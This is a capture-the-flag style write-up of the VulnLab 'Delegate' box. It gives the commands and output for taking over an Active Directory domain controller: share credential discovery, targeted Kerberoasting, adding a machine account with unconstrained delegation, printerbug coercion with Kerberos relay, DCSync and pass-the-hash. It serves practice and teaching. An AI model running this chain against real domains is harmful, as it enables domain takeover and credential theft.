---
title: "Delegate"
---

# Vulnlab - Delegate Writeup

![Delegate screenshot](delegate.png)

Welcome reader, today we’ll hack **Delegate** from VulnLab. Delegate, another VL box. There is a BAT script with creds on an SMB share which can be used for further enumeration. This user has generic write over another user who has remote access. I’ll Kerberoast that user, crack the hash, and use the password to get a shell on the machine. Looking at the privileges of this user, SeEnableDelegation is enabled. I’ll add a computer and its DNS, then perform unconstrained delegation to achieve DA.

## Enumeration

I started with an Nmap scan to see what services were exposed.

```bash
nmap -sC -sV 10.10.88.149 -Pn
```

The target looked like a domain controller, with DNS, Kerberos, LDAP, SMB, and RDP available.

```text
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-12 06:43:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

The RDP output also gave me the hostnames to add to `/etc/hosts`.

```text
10.10.88.149    DC1.delegate.vl delegate.vl DC1
```

## SID Brute Force

Since LDAP anonymous access was not useful, I used SID brute forcing to enumerate domain users.

```bash
impacket-lookupsid anonymous@delegate.vl
```

That revealed several user accounts and the domain SID.

```text
Domain SID is: S-1-5-21-1484473093-3449528695-2030935120
500: DELEGATE\Administrator
501: DELEGATE\Guest
502: DELEGATE\krbtgt
1104: DELEGATE\A.Briggs
1105: DELEGATE\b.Brown
1106: DELEGATE\R.Cooper
1107: DELEGATE\J.Roberts
1108: DELEGATE\N.Thompson
1121: DELEGATE\delegation admins
```

At this point I had a small user list but no credentials yet, so I kept enumerating.

## SMB Shares

I checked the SMB shares with a blank password and found only standard domain shares.

```bash
crackmapexec smb delegate.vl -u 'anonymous' -p '' --shares
```

```text
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
```

The interesting part was `NETLOGON`, where I found a batch file containing a credential hint.

```bash
smbclient //delegate.vl/NETLOGON -U 'anonymous'
```

```text
smb: \> ls
users.bat
smb: \> get users.bat
```

The file contained a password for `A.Briggs`.

```text
if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator <redacted>
```

I confirmed that the password worked.

```bash
crackmapexec smb delegate.vl -u 'A.Briggs' -p '<redacted>'
```

```text
[+] delegate.vl\A.Briggs:<redacted>
```

## BloodHound

With valid credentials, I collected BloodHound data to map the attack path.

```bash
nxc ldap delegate.vl -u 'A.Briggs' -p '<redacted>' --bloodhound -ns 10.10.88.149 --collection All
```

BloodHound showed that `A.Briggs` had `GenericWrite` over `N.Thompson`.

That meant I could abuse targeted Kerberoasting by adding an SPN to `N.Thompson`.

## Targeted Kerberoasting

I used TargetedKerberoast to add an SPN, request a ticket, and remove the SPN afterward.

```bash
python targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p '<redacted>'
```

```text
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*...
[VERBOSE] SPN removed successfully for (N.Thompson)
```

I cracked the Kerberoast hash offline.

```bash
hashcat -m 13100 nthompson.hash /usr/share/wordlists/rockyou.txt
```

That gave me the password for `N.Thompson`.

## User Shell

The cracked credentials were enough to WinRM into the machine.

```bash
evil-winrm -i delegate.vl -u 'N.Thompson' -p '<redacted>'
```

The shell showed that `N.Thompson` was in the `delegation admins` group and had useful privileges.

```text
SeMachineAccountPrivilege
SeEnableDelegationPrivilege
```

That pointed to an unconstrained delegation attack.

## Delegation Setup

I checked the MachineAccountQuota first.

```bash
crackmapexec ldap delegate.vl -u 'N.Thompson' -p '<redacted>' -M maq
```

```text
MachineAccountQuota: 10
```

Since I could create machines, I added a new computer account.

```bash
addcomputer.py -dc-ip 10.10.88.149 -computer-pass 'Password123!2023' -computer-name evilcomputer delegate.vl/N.Thompson:'<redacted>'
```

Then I enabled unconstrained delegation on that machine.

```bash
python3 bloodyAD.py -u 'N.Thompson' -d 'delegate.vl' -p '<redacted>' --host 'DC1.delegate.vl' add uac 'evilcomputer$' -f TRUSTED_FOR_DELEGATION
```

After that, I created a DNS record for the attacker-controlled host.

```bash
python3 dnstool.py -u 'delegate.vl\evilcomputer$' -p 'Password123!2023' -r evilcomputer.delegate.vl -d 10.8.0.151 --action add DC1.delegate.vl -dns-ip 10.10.88.149
```

I also added the SPN needed for the relay flow.

```bash
python addspn.py -u delegate\\N.Thompson -p '<redacted>' -s CIFS/evilcomputer.delegate.vl dc1.delegate.vl -t 'evilcomputer$' -dc-ip 10.10.88.149
python addspn.py -u delegate\\N.Thompson -p '<redacted>' -s HOST/evilcomputer.delegate.vl dc1.delegate.vl -t 'evilcomputer$' -dc-ip 10.10.88.149 --additional
```

A DNS lookup confirmed that the name resolved correctly.

```bash
nslookup evilcomputer.delegate.vl 10.10.88.149
```

```text
Name:   evilcomputer.delegate.vl
Address: 10.8.0.151
```

## Kerberos Relay

I calculated the NT hash for the fake machine password and started the relay server.

```bash
python krbrelayx.py -hashes :f2d0c0e145e8323b97cec00272d7fa01
```

Then I triggered coercion with the printer bug.

```bash
python printerbug.py -hashes :F2D0C0E145E8323B97CEC00272D7FA01 delegate.vl/evilcomputer\$@dc1.delegate.vl evilcomputer.delegate.vl
```

The relay server received a ticket for the domain controller.

```text
[*] Got ticket for [DC1$@DELEGATE.VL] [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

## DCSync

With the delegated ticket, I dumped the domain secrets.

```bash
export KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'
secretsdump.py -k dc1.delegate.vl -just-dc
```

That produced the domain hashes, including Administrator.

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
```

## Administrator Access

Finally, I logged in as Administrator with the recovered hash.

```bash
evil-winrm -i delegate.vl -u 'Administrator' -H '<redacted>'
```

That gave me a shell on the DC and completed the box.

## Attack Path

- **Enumerate the target** — identify the DC services and domain name.
- **Brute force SIDs** — collect valid user accounts without credentials.
- **Inspect SMB shares** — find the `users.bat` file in `NETLOGON`.
- **Recover a credential** — use the batch file password for `A.Briggs`.
- **Map the environment** — use BloodHound to find `GenericWrite` over `N.Thompson`.
- **Kerberoast the target** — add an SPN and crack the ticket.
- **Log in as `N.Thompson`** — gain a foothold and confirm delegation rights.
- **Create a machine account** — use MachineAccountQuota to add `evilcomputer`.
- **Enable unconstrained delegation** — mark the machine for delegation.
- **Add DNS and SPN records** — point `evilcomputer.delegate.vl` at the attacker machine.
- **Relay Kerberos** — coerce the DC to authenticate and capture the ticket.
- **DCSync the domain** — dump Administrator’s hash.
- **Log in as Administrator** — finish the machine with WinRM.
